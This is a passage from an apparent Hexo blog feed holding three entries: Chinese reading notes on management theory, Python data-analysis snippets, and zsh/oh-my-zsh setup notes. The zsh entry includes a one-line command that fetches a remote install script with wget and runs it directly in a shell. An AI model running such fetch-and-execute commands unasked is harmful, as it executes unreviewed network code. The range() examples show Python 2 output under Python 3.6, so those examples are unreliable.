src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_48.bmp"></li><li>创造一个相互信任，有利于沟通的小环境</li><li>缩短信息传递链，拓宽沟通渠道，保证信息的畅通无阻和完整性</li><li>建立特别委员会，定期加强上下级的沟通</li><li>组成非管理工作组</li><li>加强平行沟通，促进横向交流</li></ul></li></ul></li><li>组织冲突与谈判<ul><li>组织内冲突的原因<ul><li>沟通差异</li><li>结构差异</li><li>个体差异</li></ul></li><li>冲突的管理<ul><li>谨慎地选择想处理的冲突</li><li>仔细研究冲突双方的代表人物</li><li>深入了解冲突的根源</li><li>妥善的选择处理办法<img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_49.bmp"></li></ul></li><li>有效谈判的实现<ul><li>谈判有两种基本方法<ul><li>笭和谈判就是有输有赢的谈判，一方所得就是另一方所失</li><li>双赢谈判就是谈判要找到一种双方都赢的方案</li></ul></li><li>优秀的管理者实现有效的谈判，一般要遵循如下的原则。<ul><li>理性分析谈判的事件</li><li>理解你的谈判对手</li><li>抱着诚意开始谈判</li><li>坚定与灵活相结合</li></ul></li></ul></li></ul></li></ul><h3 id="综合案例-3"><a href="#综合案例-3" class="headerlink" title="综合案例"></a>综合案例</h3><ul><li>“闲可钓鱼”与“无暇吃鱼”</li><li>晋升停滞的骨干员工，留得住吗？</li></ul><h2 id="第五篇、控制"><a href="#第五篇、控制" class="headerlink" title="第五篇、控制"></a>第五篇、控制</h2><h3 id="十四、控制与控制过程"><a href="#十四、控制与控制过程" class="headerlink" title="十四、控制与控制过程."></a>十四、控制与控制过程.</h3><ul><li>控制活动<ul><li>控制的必要性<ul><li>环境的变化</li><li>管理权力的分散</li><li>工作能力的差异</li></ul></li><li>控制的基本原理</li><li>控制类型<ul><li>根据确定控制标准Z 值的方法分类<ul><li>程序控制</li><li>跟踪控制</li><li>自适应控制</li><li>最佳控制</li></ul></li><li>根据时机、对象和目的分类<ul><li>前馈控制</li><li>同期控制</li><li>反馈控制</li></ul></li></ul></li></ul></li><li>控制过程<ul><li>确立标准<ul><li>确定控制对象<ul><li>关于环境特点及其发展趋势的假设</li><li>资源投入</li><li>组织的活动</li></ul></li><li>选择控制的重点<ul><li>获利能力</li><li>市场地位</li><li>生产率</li><li>产品领导地位</li><li>人员发展</li><li>员工态度</li><li>公共责任</li><li>短期目标与长期目标的平衡</li></ul></li><li>制定标准的方法<ul><li>统计性标准</li><li>根据评估建立标准</li><li>工程标准</li></ul></li></ul></li><li>衡量绩效<ul><li>通过衡量成绩，检验标准的客观性和有效性</li><li>确定适宜的衡量频度</li><li>建立信息反馈系统</li></ul></li><li>纠正偏差<ul><li>找出偏差产生的主要原因</li><li>确定纠偏措施的实施对象</li><li>选择恰当的纠偏措施<ul><li>使纠偏方案双重优化</li><li>充分考虑原先计划实施的影响</li><li>注意消除人们对纠偏措施的疑虑</li></ul></li></ul></li></ul></li><li>有效控制<ul><li>适时控制</li><li>适度控制<ul><li>防止控制过多或控制不足</li><li>处理好全面控制与重点控制的关系</li><li>使花费一定费用的控制得到足够的控制收益 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_50.bmp"></li></ul></li><li>客观控制</li><li>弹性控制</li></ul></li></ul><h3 id="十五、控制方法"><a href="#十五、控制方法" class="headerlink" title="十五、控制方法"></a>十五、控制方法</h3><ul><li>预算控制<ul><li>预算的编制</li><li>预算的种类<ul><li>收入预算</li><li>支出预算<ul><li>直接材料预算</li><li>直接人工预算</li><li>附加费用预算</li></ul></li><li>现金预算</li><li>资金支出预算</li><li>资产负债预算</li></ul></li><li>预算的作用及缺点</li></ul></li><li>生产控制<ul><li>对供应商的控制</li><li>库存控制</li><li>质量控制</li></ul></li><li>财务控制方法<ul><li>比率分析<ul><li>财务比率<ul><li>流动比率</li><li>速动比率</li><li>负债比率</li><li>盈利比率</li></ul></li><li>经营比率<ul><li>库存周转率</li><li>固定资产周转率</li><li>销售收人与销售费用的比率</li></ul></li></ul></li><li>经营审计<ul><li>外部审计</li><li>内部审计</li><li>管理审计<ul><li>反映企业管理绩效及其影响因素主要有：<ul><li>经济功能</li><li>企业组织结构</li><li>收入合理性</li><li>研究与开发</li><li>财务政策</li><li>生产效率</li><li>销售能力</li><li>对管理当局的评估</li></ul></li></ul></li></ul></li><li>其他方法</li></ul></li><li>综合控制方法<ul><li>标杆控制<ul><li>标杆控制的内涵</li><li>标杆控制的步骤<ul><li>确定标杆控制的项目</li><li>确定标杆控制的对象和对比点</li><li>组成工作小组，确定工作计划</li><li>资料收集和调查</li><li>分析比较，找出差距，确定最佳纠偏做法</li><li>明确改进方向，制定实施方案</li><li>沟通与修正方案</li><li>实施与监督</li><li>总结经验</li><li>进行再标杆循环</li></ul></li><li>标杆控制的作用和缺陷</li></ul></li><li>平衡积分卡控制<ul><li>平衡积分卡控制的内涵<ul><li>平衡积分卡将企业的战略置千核心地位</li><li>平衡积分卡使战略在企业上下进行交流和学习，并与各部门和个人的目标联系起来</li><li>平衡积分卡使战略目标在各个经营层面达成一致</li><li>平衡积分卡有助于短期成果和长远发展的协同和统一</li></ul></li><li>平衡积分卡的控制指标<ul><li>财务方面</li><li>客户方面</li><li>内部经营过程</li><li>学习和成长<img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_51.bmp"></li></ul></li><li>平衡积分卡的控制作用</li></ul></li></ul></li></ul><h3 id="综合案例-4"><a href="#综合案例-4" class="headerlink" title="综合案例"></a>综合案例</h3><ul><li>“模拟市场核算，实行成本否决”的邯钢模式</li></ul><h2 id="第六篇、创新"><a href="#第六篇、创新" class="headerlink" title="第六篇、创新"></a>第六篇、创新</h2><h3 id="十六、管理的创新职能"><a href="#十六、管理的创新职能" class="headerlink" title="十六、管理的创新职能"></a>十六、管理的创新职能</h3><ul><li>创新及其作用<ul><li>作为管理基本职能的创新<ul><li>创新工作是管理过程的重要一环<ul><li>确立系统的目标，即人们从事某项活动希望达到的状况和水平；</li><li>制定并选择可实现目标的行动方案；</li><li>分解目标活动，据此设计系统所需要的职务、岗位，并加以组合，规定它们之间相互关系，形成一定的系统结构；</li><li>根据各岗位的工作要求，招聘和调配工作人员；</li><li>发布工作指令，组织供应各环节活动所需的物质和信息条件，使系统运行起来；</li><li>在系统运转过程中，协调各部分的关系，使他们的工作相互衔接、平衡地进行；</li><li>检查和控制各部门的工作，纠正实际工作中的失误和偏差，使之符合预定的要求；</li><li>注视内外条件的变化，寻找并利用变革的机会，计划并组织实施系统的变化和发展</li></ul></li><li>创新工作是重要管理活动</li><li>创新工作具有逻辑的结构</li></ul></li><li>创新与维持的关系及其作用</li><li>创新的类别与特征<ul><li>系统内部的创新可以从不同的角度去考察。<ul><li>从创新的规模以及创新对系统的影响程度考察，可将其分为局部创新和整体创新。</li><li>从创新与环境的关系来分析，可将其分为消极防御型创新与积极攻击型创新。</li><li>从创新发生的时期来看，可将其分为系统初建期的创新和运行中的创新。</li><li>从创新的组织程度上看，可分为自发创新与有组织的创新。</li></ul></li><li>有组织的创新包含飞列两层意思。<ul><li>系统的管理人员根据创新的客观要求和创新活动本身的客观规律一，制度化地研究外部环境状况和内部工作，寻求和利用创新机会，计划和组织创新活动。</li><li>在这同时，系统的管理人员要积极地引导和利用各要素的自发创新，使之相互协调并与系统有计划的创新活动相配合，使整个系统内的创新活动有计划有组织地展开。只有有组织的创新，才能给系统带来预期的、积极的、比较确定的结果。</li></ul></li></ul></li></ul></li><li>创新职能的基本内容<ul><li>目标创新</li><li>技术创新<ul><li>要素创新<ul><li>材料创新</li><li>设备创新</li></ul></li><li>要素组合方法创新</li><li>要素组合结果创新</li></ul></li><li>制度创新<ul><li>产权制度</li><li>经营制度</li><li>管理制度</li></ul></li><li>组织机构和结构的创新</li><li>环境创新</li></ul></li><li>创新过程及其管理<ul><li>创新的过程<ul><li>抵制创新的原因<ul><li>个人利益</li><li>缺乏了解</li><li>评价差异</li><li>惰性</li><li>团体心理压力</li></ul></li><li>创新活动的过程<ul><li>寻找机会</li><li>提出构想</li><li>迅速行动</li><li>坚持不懈</li></ul></li></ul></li><li>领导创新</li><li>创新管理的技能<ul><li>正确理解和扮演“管理者”的角色</li><li>创造促进创新的组织氛围</li><li>制定有弹性的计划</li><li>正确地对待失败</li><li>建立合理的奖酬制度<ul><li>注意物质奖励与精神奖励的结合</li><li>奖励不能视作“不犯错误的报酬”‘而应是对特殊贡献、甚至是对希望做出特殊贡献的努力的报酬；奖励的对象不仅包括成功以后的创新者，而且应当包括那些成功以前、甚至是没有获得成功的努力者</li><li>奖励制度要既能促进内部之竞争，又能保证成员间的合作</li></ul></li></ul></li></ul></li><li>工作流程的再造<ul><li>工作流程特性和功能<ul><li>组织基本流程的类型</li><li>组织工作流程构成的影响因素<ul><li>工作流程的构成<ul><li>工作</li><li>逻辑关系</li><li>转换关系</li></ul></li><li>影响工作流程构成的因素<ul><li>组织的文化</li><li>工艺技术特征</li><li>管理风格</li></ul></li></ul></li></ul></li><li>流程再造的基本观念<ul><li>组织企业实施业务流程再造是企业长期可持续发展的战略需要</li><li>组织工作流程再造的根本目标是建立顾客满意的工作流程</li><li>组织工作流程再造追求实现目标、技术和人的动态平衡</li></ul></li><li>流程再造的基本途径 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_52.bmp"> * BPR 运作程序大致划分为四大类： * 描述项目（ 确定项目边界）；设立远景，价值观和目标；再设计业务流程和相关工具、模型评估概念；制定实施方案；实施再设计；通过绩效衡量来实现持续性的流程改进。 * 项目界定；建立AS一1S 流程模型．即对现有流程进行诊断；再设计业务流程； 进行成本—收益分析：计划并实施新的流程体系； 评估流程绩效。 * 项目界定，确定项目理想目标；向业务相关人员（顾客、合作者、业内标杆技术领先者）学习；建立远景，并设计新的业务流程模型； 开发相配套的技术支持系统和组织结构；实施改进分析，并准备跟踪业务的成本收益变化；定义流程系统，开展必要的培训，并实施计划；开发解决方案；实施解决方案并衡量绩效改进效果。 * 项目界定并组建项目团队；运用头脑风暴法来发掘新的流程和技术；分析并优化改进的可能性（收益分析）；机会择优，并设计解决方案；开发新的业务流程、信息系统和可用工具；制定实施计划并执行解决方案；绩效衡量。</li></ul></li></ul><h3 id="十七、企业技术创新"><a href="#十七、企业技术创新" class="headerlink" title="十七、企业技术创新"></a>十七、企业技术创新</h3><ul><li>技术创新及其贡献<ul><li>创新与技术创新</li><li>技术创新的贡献</li></ul></li><li>技术创新的源泉<ul><li>意外的成功或失败</li><li>企业内外的不协调</li><li>过程改进的需要</li><li>行业和市场结构的变化</li><li>人口结构的变化</li><li>观念的改变</li><li>新知识的产生</li></ul></li><li>技术创新的战略及其选择<ul><li>创新基础的选择</li><li>创新对象的选择</li><li>创新水平的选择<ul><li>先发制人可给企业带来下述贡献。<ul><li>可给企业带来良好的声誉</li><li>可使企业占据有利的市场地位</li><li>可使企业进入最有利的销售渠道</li><li>可使企业获得有利的要素来源</li><li>可使企业获取高额的垄断利润</li></ul></li><li>率先开发某种技术或产品可能给企业带来以下几个方面的烦恼<ul><li>要求企业付出高额的市场开发费用</li><li>需求的不确定性</li><li>技术的不确定性</li></ul></li></ul></li><li>创新方式的选择</li></ul></li><li>技术创新与产品开发<ul><li>产品开发的任务<ul><li>产品性质的确定</li><li>产品质量的确定<ul><li>消费者希望得到哪些功能？除基本功能外，还要求得到何种辅助功能？</li><li>消费者对产品功能差异的辨识能力如何？如果消费者在使用过程中不能感受到不同产品的功能差异，那么就可能不愿为功能更完善的产品支付更高的价格。</li><li>进一步完善产品功能的成本是多少？是否与消费者愿意支付的费用大致相同？换句话说，产品质量完善的经济效益如何？</li></ul></li><li>新产品开发</li></ul></li><li>产品竞争战略<ul><li>领先战略</li><li>追随战略</li><li>模仿战略</li></ul></li><li>产品开发的分析方法<ul><li>投入期</li><li>成长期</li><li>成熟期</li><li>衰退期</li></ul></li></ul></li></ul><h3 id="十八、企业组织创新"><a href="#十八、企业组织创新" class="headerlink" title="十八、企业组织创新"></a>十八、企业组织创新</h3><ul><li>企业制度创新<ul><li>企业制度及其分类<ul><li>企业制度及其功能</li><li>企业制度分类的线索<ul><li>企业制度分类的参与者因子<ul><li>劳动与劳动者</li><li>资本与资本供应者</li><li>知识与经营者</li></ul></li><li>企业制度分类的关系因子<ul><li>权力关系</li><li>利益关系</li><li>权力关系与利益关系的“逻辑“一致性</li></ul></li><li>企业制度的不同类型<ul><li>资本逻辑的企业制度</li><li>劳动逻辑的企业制度</li><li>知识逻辑的企业制度</li><li>综合逻辑的企业制度</li></ul></li></ul></li></ul></li><li>工业社会的企业制度结构选择及其特征</li><li>知识经济条件下的企业制度创新</li></ul></li><li>企业层次结构创新<ul><li>层级结构及其基本类型<ul><li>相对比较集权的锥型形态</li><li>相对比较分权的扁平形态</li></ul></li><li>工业社会的企业层级结构及其特征<ul><li>直线指挥，分层授权</li><li>分工细致，权责明确</li><li>标准统一，关系正式</li></ul></li><li>知识经济与企业层级结构的改造<ul><li>集权和分权的统一</li><li>稳定与变化的统一</li><li>一元性与多元性的统一</li></ul></li></ul></li><li>企业文化创新<ul><li>企业文化的功能与反功能<ul><li>行为导向功能</li><li>行为激励功能</li><li>行为协调功能</li></ul></li><li>工业社会中企业文化的特点<ul><li>企业文化是作为企业经营的一种副产品而出现的</li><li>企业文化基本上反映了企业组织的记忆</li><li>企业文化是作为一种辅助手段而发挥作用的</li><li>企业文化是一元的</li></ul></li><li>知识经济与企业文化创新<ul><li>第一，企业文化将成为知识经济条件下企业管理的重要的，甚至是主要的手段。</li><li>第二，企业文化将是人们自觉创造的结果，而不是企业生产经营中的一种副产品。</li><li>第三，作为人们自觉行为结果的企业文化不仅是记忆型的，而且是学习型的，或者更准确地说，主要不是记忆型的，而是学习型的</li><li>第四，企业文化将在强调主导价值观与行为准则的同时，允许异质价值观和行为准则的存在。</li></ul></li></ul></li></ul><h3 id="综合案例-5"><a href="#综合案例-5" class="headerlink" title="综合案例"></a>综合案例</h3><ul><li>小天鹅的”末日管理”</li><li>矩阵管理——团的管理创新</li></ul>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Book</category>
      </categories>
  </entry>
  <entry>
    <title>数据处理笔记（python）</title>
    <url>/2018/10/25/2018-10-25-dataScienceStudyPython/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Python 3.6.4</span><br><span class="line">Anaconda, Inc.</span><br><span class="line">(default, Jan 16 2018, 10:22:32) [MSC v.1900 64 bit (AMD64)] on win32</span><br></pre></td></tr></table></figure><h1 id="默认函数"><a href="#默认函数" class="headerlink" title="默认函数"></a>默认函数</h1><h2 id="range-列表"><a href="#range-列表" class="headerlink" title="range 列表"></a>range 列表</h2><p>创建一个整数列表</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;range(<span class="number">10</span>)        <span class="comment"># 从 0 开始到 10</span></span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>range(<span class="number">1</span>, <span class="number">11</span>)     <span class="comment"># 从 1 开始到 11</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>range(<span class="number">0</span>, <span class="number">30</span>, <span class="number">5</span>)  <span class="comment"># 步长为 5</span></span><br><span class="line">[<span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">25</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>range(<span class="number">0</span>, <span class="number">10</span>, <span class="number">3</span>)  <span class="comment"># 步长为 3</span></span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>range(<span class="number">0</span>, <span class="number">-10</span>, <span class="number">-1</span>) <span class="comment"># 负数</span></span><br><span class="line">[<span class="number">0</span>, <span class="number">-1</span>, <span class="number">-2</span>, <span class="number">-3</span>, <span class="number">-4</span>, <span class="number">-5</span>, <span class="number">-6</span>, <span class="number">-7</span>, <span class="number">-8</span>, <span class="number">-9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>range(<span class="number">0</span>)</span><br><span class="line">[]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>range(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><h1 id="pandas"><a href="#pandas" class="headerlink" title="pandas"></a>pandas</h1><h2 id="显示数据的各种统计数据"><a href="#显示数据的各种统计数据" class="headerlink" title="显示数据的各种统计数据"></a>显示数据的各种统计数据</h2><p>包括中位数、平均数、标准差、最值等</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dataframe.describe()</span><br><span class="line">series.describe()</span><br></pre></td></tr></table></figure><h2 id="csv格式文件读取"><a href="#csv格式文件读取" class="headerlink" title="csv格式文件读取"></a>csv格式文件读取</h2><p>可以使用<code>read_csv()</code>函数将<code>csv</code>读入成<code>dataframe</code>的格式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">test_df = pd.read_csv(<span class="string">'test.csv'</span>)</span><br></pre></td></tr></table></figure><h2 id="dataframe"><a href="#dataframe" class="headerlink" title="dataframe"></a>dataframe</h2><h3 id="显示行列数"><a href="#显示行列数" class="headerlink" title="显示行列数"></a>显示行列数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(X_train_df.shape)</span><br></pre></td></tr></table></figure><h3 id="转成ndarray多维矩阵形式"><a href="#转成ndarray多维矩阵形式" class="headerlink" title="转成ndarray多维矩阵形式"></a>转成ndarray多维矩阵形式</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_ndarray = X_train_df.values</span><br></pre></td></tr></table></figure><h3 id="删除一列"><a href="#删除一列" class="headerlink" title="删除一列"></a>删除一列</h3><p>不会改变原变量，删除结果由返回值给出</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">X_train = train.drop(labels = [<span class="string">"label"</span>], axis = <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="删除一行"><a href="#删除一行" class="headerlink" title="删除一行"></a>删除一行</h3><p>不会改变原变量，删除结果由返回值给出</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">X_train_df = train.drop(index = <span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="提取一列"><a href="#提取一列" class="headerlink" title="提取一列"></a>提取一列</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Y_train_series = train[<span class="string">'labels'</span>]</span><br></pre></td></tr></table></figure><h3 id="判断空值"><a href="#判断空值" class="headerlink" title="判断空值"></a>判断空值</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">isNull_df = X_train_df.isnull() <span class="comment">#得到一个同纬度的true和false组成的dataframe</span></span><br><span class="line">isNull_df.any()                 <span class="comment">#显示各列的情况是否含有true，相当于各列取或</span></span><br></pre></td></tr></table></figure><h2 id="Series-序列"><a href="#Series-序列" class="headerlink" title="Series 序列"></a>Series 序列</h2><h3 id="统计各值出现数量"><a href="#统计各值出现数量" class="headerlink" title="统计各值出现数量"></a>统计各值出现数量</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(Y_train_series.value_counts())</span><br></pre></td></tr></table></figure><h1 id="numpy"><a href="#numpy" class="headerlink" title="numpy"></a>numpy</h1><h2 id="numpy数据存取"><a href="#numpy数据存取" class="headerlink" title="numpy数据存取"></a>numpy数据存取</h2><p>numpy有一个可以直接将numpy数组矩阵按照原来的格式储存和读取的函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 储存data</span></span><br><span class="line">np.save(<span class="string">"file directory"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取data</span></span><br><span class="line">data = np.load(<span class="string">"file directory"</span>)</span><br></pre></td></tr></table></figure><p>这个方法可以直接将shape也存下来，不需要考虑格式、类型等，缺点是文件会有点大。</p><h2 id="ndarray-矩阵"><a href="#ndarray-矩阵" class="headerlink" title="ndarray 矩阵"></a>ndarray 矩阵</h2><h3 id="reshape-重置矩阵形状"><a href="#reshape-重置矩阵形状" class="headerlink" title="reshape 重置矩阵形状"></a>reshape 重置矩阵形状</h3><p>从最外层开始重置矩阵形状，默认按行读取，-1代表未知数量，由numpy自动计算</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_ndarray = test_ndarray.reshape(<span class="number">-1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">print(test_ndarray.shape)   <span class="comment">#out: (42000, 28, 28, 1)</span></span><br></pre></td></tr></table></figure><h2 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h2><ul><li>随机种子</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h2 id="linespace-列表"><a href="#linespace-列表" class="headerlink" title="linespace 列表"></a>linespace 列表</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">y = np.linspace(m, n, z) <span class="comment"># 在[m, n]等距离取z个点</span></span><br><span class="line">x = np.linspace(m, n) <span class="comment"># 同上，z默认取50</span></span><br></pre></td></tr></table></figure><h1 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h1><h2 id="pyplot-画图"><a href="#pyplot-画图" class="headerlink" title="pyplot 画图"></a>pyplot 画图</h2><h3 id="新开一个页面-figure"><a href="#新开一个页面-figure" class="headerlink" title="新开一个页面 figure"></a>新开一个页面 figure</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line">...</span><br><span class="line">plt.figure()</span><br><span class="line">...</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h3 id="一页多图-subplot"><a href="#一页多图-subplot" class="headerlink" title="一页多图 subplot"></a>一页多图 subplot</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line">plt.subplot(<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>) <span class="comment"># 3行2列，从左向右，从上向下，第一个</span></span><br><span class="line">...</span><br><span class="line">plt.subplot(<span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="comment"># 3行2列，从左向右，从上向下，第三个</span></span><br><span class="line">...</span><br><span class="line">plt.subplot(<span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>) <span class="comment"># 3行2列，从左向右，从上向下，第五个</span></span><br><span class="line">...</span><br><span class="line">plt.subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>) <span class="comment"># 1行2列，从左向右，从上向下，第二个</span></span><br><span class="line">...</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>效果图</p><img src="/2018/10/25/2018-10-25-dataScienceStudyPython/2018_11_29_01.png"><h3 id="页面属性更改"><a href="#页面属性更改" class="headerlink" title="页面属性更改"></a>页面属性更改</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.figure(<span class="string">"abc"</span>) <span class="comment"># 整个图表名字</span></span><br><span class="line">...</span><br><span class="line">plt.xlabel(<span class="string">"x"</span>) <span class="comment"># 横坐标名称</span></span><br><span class="line">plt.ylabel(<span class="string">"y"</span>) <span class="comment"># 纵坐标名称</span></span><br><span class="line">plt.title(<span class="string">"y = f(x)"</span>) <span class="comment"># 当前图的名字</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h3 id="stem-散点图"><a href="#stem-散点图" class="headerlink" title="stem 散点图"></a>stem 散点图</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">y = np.linspace(<span class="number">0</span>, <span class="number">100</span>, <span class="number">32</span>)</span><br><span class="line">x = list(range(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line">plt.stem(x, y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>效果图</p><img src="/2018/10/25/2018-10-25-dataScienceStudyPython/2018_11_29_02.png"><h1 id="seaborn"><a href="#seaborn" class="headerlink" title="seaborn"></a>seaborn</h1><h2 id="画图统计向量中值的出现次数-countplot"><a href="#画图统计向量中值的出现次数-countplot" class="headerlink" title="画图统计向量中值的出现次数 countplot"></a>画图统计向量中值的出现次数 countplot</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line">...</span><br><span class="line">sns.countplot(Y_train)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>效果图</p><img src="/2018/10/25/2018-10-25-dataScienceStudyPython/2018_11_29_03.png"><h1 id="scipy"><a href="#scipy" class="headerlink" title="scipy"></a>scipy</h1><h2 id="fftpack"><a href="#fftpack" class="headerlink" title="fftpack"></a>fftpack</h2><h3 id="fft-快速傅里叶变换"><a href="#fft-快速傅里叶变换" class="headerlink" title="fft 快速傅里叶变换"></a>fft 快速傅里叶变换</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.fftpack <span class="keyword">import</span> fft</span><br><span class="line"></span><br><span class="line">x = np.linspace(<span class="number">0</span>, <span class="number">100</span>, <span class="number">32</span>)</span><br><span class="line">y = fft(x) <span class="comment"># 得到x的32点fft</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Program</category>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>zsh配置记录</title>
    <url>/2018/10/25/2018-10-25-zshConfig/</url>
    <content><![CDATA[<h1 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h1><h2 id="apt包管理系列"><a href="#apt包管理系列" class="headerlink" title="apt包管理系列"></a>apt包管理系列</h2><p>直接执行命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install zsh</span><br></pre></td></tr></table></figure><h1 id="配置zsh"><a href="#配置zsh" class="headerlink" title="配置zsh"></a>配置zsh</h1><h2 id="默认使用zsh作为shell"><a href="#默认使用zsh作为shell" class="headerlink" title="默认使用zsh作为shell"></a>默认使用zsh作为shell</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure><p>重启终端即可</p><h2 id="使用oh-my-zsh美化zsh"><a href="#使用oh-my-zsh美化zsh" class="headerlink" title="使用oh-my-zsh美化zsh"></a>使用oh-my-zsh美化zsh</h2><h3 id="安装oh-my-zsh"><a href="#安装oh-my-zsh" class="headerlink" title="安装oh-my-zsh"></a>安装oh-my-zsh</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh -c "$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)"</span><br></pre></td></tr></table></figure><p>自动安装，会直接使用默认主题<code>robbyrussell</code></p><h3 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h3><p>执行以下命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure><p>找到</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME="robbyrussell"</span><br></pre></td></tr></table></figure><p>改为自己想要的主题即可，推荐一个主题<code>ys</code></p><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><h4 id="代码高亮-zsh-syntax-highlighting"><a href="#代码高亮-zsh-syntax-highlighting" class="headerlink" title="代码高亮 zsh-syntax-highlighting"></a>代码高亮 <code>zsh-syntax-highlighting</code></h4><p>使用以下命令安装插件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure><p>在<code>.zshrc</code>下修改<code>plugins</code>添加插件即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">    git</span><br><span class="line">    zsh-syntax-highlighting</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><h2 id="目录权限问题"><a 